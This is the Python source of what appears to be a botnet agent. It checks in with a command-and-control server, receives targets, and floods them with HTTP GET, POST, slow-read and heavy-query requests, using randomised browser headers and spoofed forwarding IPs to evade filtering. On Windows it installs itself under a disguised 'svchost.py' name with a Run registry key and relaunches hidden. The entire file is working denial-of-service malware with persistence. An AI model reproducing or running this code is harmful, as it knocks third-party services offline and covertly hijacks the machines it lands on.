import asyncio
import shutil
import platform
if platform.system() == "Windows":
    import winreg
import aiohttp
import random
import string
import os
import json
import time
import threading
import uuid
import sys
from collections import Counter
from itertools import cycle

C2_URL = "https://download.projectally.cc"
AGENT_ID = uuid.uuid4().hex[:16]
POLL_INTERVAL = 5
SILENT = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.81 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Vivaldi/7.0.3495.18",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Brave/1.73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=", "https://www.google.com/",
    "https://www.bing.com/search?q=", "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.reddit.com/",
    "https://www.youtube.com/", "https://www.instagram.com/",
    "https://t.co/", "https://www.linkedin.com/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8",
    "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
]

stats = Counter()
running = True


def _rs(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _ri():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def _hdr():
    h = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_TYPES),
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Pragma": "no-cache", "Connection": "keep-alive",
    }
    if random.random() < 0.7: h["Referer"] = random.choice(REFERERS) + _rs(random.randint(5, 20))
    if random.random() < 0.5: h["X-Forwarded-For"] = _ri()
    if random.random() < 0.3: h["X-Real-IP"] = _ri()
    if random.random() < 0.4: h["DNT"] = "1"
    if random.random() < 0.3: h["Upgrade-Insecure-Requests"] = "1"
    if random.random() < 0.2:
        h["Sec-Fetch-Dest"] = random.choice(["document", "empty", "image"])
        h["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
        h["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
    return h

def _url(base):
    sep = "&" if "?" in base else "?"
    p = f"{_rs(random.randint(3,8))}={_rs(random.randint(5,15))}"
    if random.random() < 0.3: p += f"&{_rs(4)}={_rs(8)}"
    return f"{base}{sep}{p}"

def _hurl(base):
    sep = "&" if "?" in base else "?"
    hp = [
        f"search={_rs(30)}", f"q={_rs(25)}&page={random.randint(1,9999)}",
        f"sort={_rs(10)}&order=desc&limit=1000&offset={random.randint(0,99999)}",
        f"filter={_rs(20)}&category={_rs(15)}&lang={_rs(5)}",
    ]
    return f"{base}{sep}{random.choice(hp)}&{_rs(5)}={_rs(8)}"

def _post():
    m = random.randint(1, 3)
    if m == 1:
        f = {_rs(random.randint(4, 10)): _rs(random.randint(10, 200)) for _ in range(random.randint(3, 15))}
        return "&".join(f"{k}={v}" for k, v in f.items()), "application/x-www-form-urlencoded"
    elif m == 2:
        p = {_rs(8): _rs(random.randint(20, 500)) for _ in range(random.randint(2, 10))}
        return json.dumps(p), "application/json"
    else:
        return _rs(random.randint(256, 4096)), "text/plain"


# --- WORKERS ---

async def w_get(session, target, proxy=None):
    while running:
        try:
            async with session.get(_url(target), headers=_hdr(), proxy=proxy, allow_redirects=False) as r:
                r.release(); stats[r.status] += 1; stats["sent"] += 1
        except asyncio.CancelledError: return
        except (asyncio.TimeoutError, aiohttp.ServerTimeoutError): stats["timeout"] += 1
        except: stats["error"] += 1

async def w_post(session, target, proxy=None):
    while running:
        try:
            h = _hdr(); d, ct = _post(); h["Content-Type"] = ct
            async with session.post(_url(target), headers=h, data=d, proxy=proxy, allow_redirects=False) as r:
                r.release(); stats[r.status] += 1; stats["sent"] += 1
        except asyncio.CancelledError: return
        except (asyncio.TimeoutError, aiohttp.ServerTimeoutError): stats["timeout"] += 1
        except: stats["error"] += 1

async def w_slow(session, target, proxy=None):
    while running:
        try:
            async with session.get(_url(target), headers=_hdr(), proxy=proxy, allow_redirects=False) as r:
                stats[r.status] += 1; stats["sent"] += 1
                async for _ in r.content.iter_chunked(1):
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    if not running: break
        except asyncio.CancelledError: return
        except (asyncio.TimeoutError, aiohttp.ServerTimeoutError): stats["timeout"] += 1
        except: stats["error"] += 1

async def w_heavy(session, target, proxy=None):
    while running:
        try:
            async with session.get(_hurl(target), headers=_hdr(), proxy=proxy, allow_redirects=False) as r:
                r.release(); stats[r.status] += 1; stats["sent"] += 1
        except asyncio.CancelledError: return
        except (asyncio.TimeoutError, aiohttp.ServerTimeoutError): stats["timeout"] += 1
        except: stats["error"] += 1

async def w_mix(session, target, proxy=None):
    while running:
        roll = random.random()
        try:
            h = _hdr()
            if roll < 0.5:
                async with session.get(_url(target), headers=h, proxy=proxy, allow_redirects=False) as r:
                    r.release(); stats[r.status] += 1; stats["sent"] += 1
            elif roll < 0.8:
                d, ct = _post(); h["Content-Type"] = ct
                async with session.post(_url(target), headers=h, data=d, proxy=proxy, allow_redirects=False) as r:
                    r.release(); stats[r.status] += 1; stats["sent"] += 1
            else:
                async with session.get(_hurl(target), headers=h, proxy=proxy, allow_redirects=False) as r:
                    r.release(); stats[r.status] += 1; stats["sent"] += 1
        except asyncio.CancelledError: return
        except (asyncio.TimeoutError, aiohttp.ServerTimeoutError): stats["timeout"] += 1
        except: stats["error"] += 1

MODE_FN = {"1": w_get, "2": w_post, "3": w_slow, "4": w_mix, "5": w_heavy}


# --- FLOOD ENGINE ---

async def run_flood(target, concurrent, duration, mode="4"):
    global running, stats
    running = True
    stats = Counter()

    worker_fn = MODE_FN.get(mode, w_mix)
    num_pools = max(1, min(concurrent // 100, 8))
    sessions = []

    timeout = aiohttp.ClientTimeout(
        total=30 if mode == "3" else 8, connect=5,
        sock_read=25 if mode == "3" else 5, sock_connect=5,
    )

    for i in range(num_pools):
        fc = (i % 3 == 0)
        ck = dict(limit=0, limit_per_host=0, ttl_dns_cache=300, ssl=False,
                  force_close=fc, enable_cleanup_closed=True)
        if not fc: ck["keepalive_timeout"] = 30
        sessions.append(aiohttp.ClientSession(connector=aiohttp.TCPConnector(**ck), timeout=timeout))

    workers = []
    if mode == "4":
        slow_c = max(1, concurrent // 20)
        normal_c = concurrent - slow_c
        for i in range(normal_c):
            s = sessions[i % len(sessions)]
            workers.append(asyncio.create_task(w_mix(s, target)))
        for i in range(slow_c):
            s = sessions[i % len(sessions)]
            workers.append(asyncio.create_task(w_slow(s, target)))
    else:
        for i in range(concurrent):
            s = sessions[i % len(sessions)]
            workers.append(asyncio.create_task(worker_fn(s, target)))

    await asyncio.sleep(duration)
    running = False

    for w in workers: w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    for s in sessions: await s.close()


# --- C2 AGENT ---

_flood_thread = None
_last_sent = 0
_last_time = time.time()
_current_target = None

def _log(msg):
    if not SILENT:
        print(msg)

def _calc_rps():
    global _last_sent, _last_time
    if not _flood_thread or not _flood_thread.is_alive():
        _last_sent = 0
        return 0
    now = time.time()
    cur = stats.get("sent", 0)
    dt = now - _last_time
    rps = int((cur - _last_sent) / dt) if dt > 0 else 0
    _last_sent = cur
    _last_time = now
    return rps

def _flood_runner(target, workers, duration, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def _run():
        task = asyncio.create_task(run_flood(target, workers, duration, mode))
        while not task.done():
            await asyncio.sleep(0.5)
            if not running:
                task.cancel()
                break
        try: await task
        except asyncio.CancelledError: pass
    try:
        loop.run_until_complete(_run())
    except: pass
    finally:
        loop.close()
    _log("[*] flood bitti")

def _checkin(rps=0):
    try:
        import requests
        r = requests.post(f"{C2_URL}/api/c2/checkin", json={
            "agent_id": AGENT_ID,
            "os": platform.system() + " " + platform.release(),
            "country": "", "rps": rps
        }, timeout=10)
        if r.status_code == 200:
            return r.json()
    except: pass
    return None

def _report(rps):
    try:
        import requests
        requests.post(f"{C2_URL}/api/c2/report", json={
            "agent_id": AGENT_ID, "rps": rps
        }, timeout=5)
    except: pass

def _start_flood(target, wk, dur, mode):
    global _flood_thread, _last_sent, _last_time, _current_target, running, stats
    if _flood_thread and _flood_thread.is_alive():
        if _current_target == target: return
        _stop_flood()
        time.sleep(1)
    stats = Counter()
    running = True
    _last_sent = 0
    _last_time = time.time()
    _current_target = target
    _flood_thread = threading.Thread(target=_flood_runner, args=(target, wk, dur, mode), daemon=True)
    _flood_thread.start()
    _log(f"[*] flood: {target} w={wk} d={dur} m={mode}")

def _stop_flood():
    global _current_target, running
    running = False
    _current_target = None
    _log("[*] flood durduruldu")

def _agent_loop():
    _log(f"[*] Agent {AGENT_ID}")
    _log(f"[*] C2: {C2_URL}")
    while True:
        rps = _calc_rps()
        resp = _checkin(rps)
        if resp:
            cmd = resp.get("command", "idle")
            if cmd == "run":
                t = resp.get("target", "")
                w = resp.get("workers", 300)
                d = resp.get("duration", 60)
                m = str(resp.get("mode", "4"))
                if not _flood_thread or not _flood_thread.is_alive():
                    _start_flood(t, w, d, m)
                elif _current_target != t:
                    _stop_flood(); time.sleep(1); _start_flood(t, w, d, m)
                else:
                    _report(rps)
            elif cmd == "idle":
                if _flood_thread and _flood_thread.is_alive():
                    _stop_flood()
        time.sleep(POLL_INTERVAL)

def _persist():
    if platform.system() != "Windows":
        return
    try:
        dst = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Network", "netmod")
        os.makedirs(dst, exist_ok=True)
        src = os.path.abspath(__file__)
        tgt = os.path.join(dst, "svchost.py")
        if not os.path.exists(tgt) or os.path.getmtime(src) > os.path.getmtime(tgt):
            shutil.copy2(src, tgt)
        py = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(py):
            py = sys.executable
        cmd = f'"{py}" "{tgt}"'
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsNetworkService", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        import subprocess
        subprocess.Popen([py, tgt],
        creationflags=0x00000008 | 0x00000200,
        close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    except Exception:
        pass

def start(silent=True):
    global SILENT
    SILENT = silent
    _persist()
    t = threading.Thread(target=_agent_loop, daemon=True)
    t.start()
    return t



if __name__ == "__main__":
    SILENT = False
    try:
        _agent_loop()
    except KeyboardInterrupt:
        running = False
